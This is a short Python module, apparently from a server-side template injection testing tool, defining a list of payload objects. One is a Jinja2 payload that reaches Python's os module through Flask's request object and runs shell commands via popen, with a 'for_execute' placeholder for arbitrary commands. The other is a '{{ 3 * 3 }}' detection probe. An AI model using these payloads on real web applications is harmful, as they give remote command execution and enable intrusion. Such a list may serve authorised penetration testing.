from app.core.payloads.payload import Payload

BASE_PAYLOADS = [
Payload(
        '{{ request.__class__._load_form_data.__globals__.__builtins__.__import__("os").popen("echo whoami").read()}}',
        "whoami\n",
        '{{ request.__class__._load_form_data.__globals__.__builtins__.__import__("os").popen("for_execute").read()}}'
    ),

Payload(
        '{{ 3 * 3 }}',
        "9",
        None
    ),

]